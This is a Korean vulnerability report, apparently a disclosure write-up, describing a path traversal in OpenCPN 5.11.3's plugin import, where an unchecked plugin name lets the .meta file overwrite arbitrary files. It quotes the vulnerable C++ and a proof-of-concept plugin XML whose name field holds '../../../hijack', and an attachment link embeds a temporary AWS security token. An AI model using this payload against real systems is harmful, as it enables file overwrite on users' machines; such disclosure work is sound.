---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-12 09:07
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QWPDQDUZ%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T000708Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEAaCXVzLXdlc3QtMiJHMEUCIQCyX0MANI7zZLxQv9Z%2F3OgcO7h9DCpdNMdIqo4UyvLWlgIgEcfsMAWQhcfnR8f5tgjcZ3xy9FDHxAx4npmxXf%2F%2BC4wq%2FwMICRAAGgw2Mzc0MjMxODM4MDUiDLewoT4ubRcH0iLn2SrcA2VSYv81sCEMJzME3UM%2F5gazqKJxpKm%2FJe3ssk%2BItCPVQ%2FyJJJlDnVl7aiss8%2F4vJlLSqYXsmncteHG3TVPI9J4sxV%2Brj%2BWwLT2tg13e9hf1J%2F%2B60ew8D8GPOF2fHj6OIyHOi%2FI6tDq20RAvGSCH3utKRJQns5IgyJ%2BcVPQdNEubc1bBpmi%2FgIZE7OPfielm4XhM4IIBe%2B3Bhfyj70f0lQ7RZjejRCnrBiyT2UTlS1k1uA3gj7RSHMucbPGUzSiwc6oLVgcKGMaX3gfg5lGcWUPMYs4TaUbRC4kg2e2%2BfcuJYekjCoE7hlMwbhrKvqj2K1DH%2BLaBvJpAloYS8D4xSyGurjerIR5lOs%2F6weMCEoRGg8zaC8o6fpLXJZ%2B2DS88oK9vS5FDHwF%2Fouk4UMoOc3cCYL%2FtVkRsId9PNAHMNwRxDr75UGzsYCiufoECqGuaHs9coFBtanDWlG47ZG9TARvfOXuOn5IRIDza%2B9FExww8yoC%2B7USW8A%2BNzLrKIikBZpz0Arv6N6HWkwhLyUPp5NkTWz2Tc7gWR2U70G%2BLsXXuyH2DN549DEQ7IsXMMQOvA%2FzoB6NC1ze0i4%2B5fI%2F24FQc2OCzMgt7ddKMt5aVf%2BxA2sX8%2BrL1VTqW8cfCMMyPrdEGOqUBfollB92iyO%2BRaqgdtpyGjHpVm77xWMwenGno5vi34%2FoDPyqNuDtq8EaV%2F%2FELBPba5unWe%2FGb8yTkE9xA5p3k1YWIEFYvzayZnmPHQs8E9aK0eb154xTbqYqWigEBDiYRs3vvI1iAIFg1VO83%2F9CETm%2FCVp%2F%2BryfL6kdUcGSTErkKH3bmUyWWhiEwLztLnPesNWd%2F6yominPj6YD3aN9S8%2FxUTcFs&X-Amz-Signature=f60237fa82fe4db202cd0ead12d5e9903588eb5ab7941f7e6609df839631112a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
